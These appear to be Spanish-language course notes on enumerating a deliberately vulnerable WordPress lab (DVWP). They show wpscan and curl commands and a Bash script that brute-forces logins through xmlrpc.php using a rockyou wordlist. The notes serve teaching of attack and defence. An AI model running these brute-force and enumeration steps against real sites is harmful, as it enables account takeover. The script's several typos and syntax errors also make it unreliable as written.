- Tags:  #wordpress #enumeration #recursos_github  #wpscan
WordPress es un CMS de código abierto muy popular que fue lanzado en 2003. Es utilizado por millones de sitios web en todo el mundo y se destaca por su facilidad de uso y flexibilidad. Con WordPress, los usuarios pueden crear y personalizar sitios web sin necesidad de conocimientos de programación avanzados. Además, cuenta con una amplia variedad de plantillas y plugins que permiten añadir funcionalidades adicionales al sitio.

El proyecto que utilizamos en esta clase para enumerar un WordPress es el siguiente:

- **DVWP**: [https://github.com/vavkamil/dvwp](https://github.com/vavkamil/dvwp)

Una de las herramientas que utilizamos en esta clase para enumerar este gestor de contenido es **Wpscan**. Wpscan es una herramienta de código abierto que se utiliza para escanear sitios web en busca de vulnerabilidades de seguridad en WordPress.

Con Wpscan, podemos realizar una enumeración completa del sitio web y obtener información detallada sobre la instalación de WordPress, como la versión utilizada, los plugins y temas instalados y los usuarios registrados en el sitio. También nos permite realizar pruebas de fuerza bruta para descubrir contraseñas débiles y vulnerabilidades conocidas en plugins y temas.

Wpscan es una herramienta muy útil para los administradores de sitios web que desean mejorar la seguridad de su sitio WordPress, ya que permite identificar y corregir vulnerabilidades antes de que sean explotadas por atacantes malintencionados. Además, es una herramienta fácil de usar y muy efectiva para identificar posibles debilidades de seguridad en nuestro sitio web.

El uso de esta herramienta es bastante sencillo, a continuación se indica la sintaxis básica:

➜ `wpscan --url https://example.com`

Si deseas enumerar usuarios o plugins vulnerables en WordPress utilizando la herramienta wpscan, puedes añadir los siguientes parámetros a la línea de comandos:

**➜** `wpscan --url https://example.com --enumerate u`

En caso de querer enumerar plugins existentes los cuales sean vulnerables, puedes añadir el siguiente parámetro a la línea de comandos:

➜ `wpscan --url https://example.com --enumerate vp`

Asimismo, otro de los recursos que contemplamos en esta clase es el archivo **xmlrpc.php**. Este archivo es una característica de WordPress que permite la comunicación entre el sitio web y aplicaciones externas utilizando el protocolo **XML-RPC**.

El archivo xmlrpc.php es utilizado por muchos plugins y aplicaciones móviles de WordPress para interactuar con el sitio web y realizar diversas tareas, como publicar contenido, actualizar el sitio y obtener información.

Sin embargo, este archivo también puede ser abusado por atacantes malintencionados para aplicar **fuerza bruta** y descubrir **credenciales válidas** de los usuarios del sitio. Esto se debe a que xmlrpc.php permite a los atacantes realizar un número ilimitado de solicitudes de inicio de sesión sin ser bloqueados, lo que hace que la ejecución de un ataque de fuerza bruta sea relativamente sencilla.

Searchsploit
```
searchsploit wordpress user enumeration
```

Whatweb
```
	whatweb http://ip
```

WPScan
```
wpscan --url https://example.com

wpscan --url https://example.com --enumerate u

wpscan --url https://example.com --enumerate vp

Utiliza el user y el rockyou para hacer brute force
wpscan --url https://example.com -U s4vitar -P /dir/rockyou.txt

```

Curl
```
curl -s -X GET 'http://ip:port' | grep plugins 
curl -s -X GET 'http://ip:port' | grep -oP 'plugis/\K[^/]+' | sort -u

Tramitar peticiones por POST e indicarle un archivo
curl -s -X Post 'http://ip:port/xmlrpc' -d@file.xml 

```

xmlrpc.sh
```
#!/bin/bash

function ctrl_c(){
	echo -e '\n\n [!]Saliendo...\n'
	exit
}

function createXML(){
password=$1
xmlfile="""
<?xml version=\"1.0\" encoding="UTF-8"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>s4vitar</value></param>
<param><value>$password</value></param>
</params>
</methodCall>"""

echo $xmlfile > file.xml

response= $(curl -s -X Post 'http://ip:port/xmlrpc' -d@file.xml)

if [! "$(echo $response | grep 'Incorrect usernema or password.')"]; then
	echo -e "\n [+] La contrasenna $password es correcta"
fi

}

#Ctrl+C
trap ctrl_c SIGINT

cat /dir/rockyuo.tkt | while read password; do
	createXML $password
done
```

En esta clase, veremos cómo abusar del archivo **xmlrpc.php** para mediante la creación de un script de Bash aplicar fuerza bruta. El objetivo de este ejercicio será demostrar cómo los atacantes pueden utilizar este archivo existente en WordPress para intentar descubrir credenciales válidas y comprometer la seguridad del sitio web.

Para lograrlo, crearemos un script de Bash en el cual emplearemos la herramienta cURL para enviar solicitudes XML-RPC al archivo xmlrpc.php del sitio web WordPress. A través del método **wp.getUsersBlogs**, enviaremos una estructura XML que contendrá el nombre de usuario y la contraseña a probar.

En caso de que las credenciales no sean correctas, el servidor responderá con un mensaje de error que indica que las credenciales son incorrectas. Sin embargo, si las credenciales son válidas, la respuesta del servidor será diferente y no incluirá el mensaje de error.

De esta forma, podremos utilizar la respuesta del servidor para determinar cuándo hemos encontrado credenciales válidas y, de esta forma, tener acceso al sitio web de WordPress comprometido.

Cabe destacar que el método wp.getUsersBlogs **no es el único método existente**, ni mucho menos la única vulnerabilidad en xmlrpc.php. Existen otros métodos como **wp.getUsers**, **wp.getAuthors** o **wp.getComments**, entre otros, que también pueden ser utilizados por atacantes para realizar ataques de fuerza bruta y comprometer la seguridad del sitio web de WordPress.

Por lo tanto, es importante tener en cuenta que la seguridad de un sitio web de WordPress no solo depende de tener contraseñas seguras y actualizadas, sino también de estar atentos a posibles vulnerabilidades en el archivo xmlrpc.php y otras áreas del sitio web.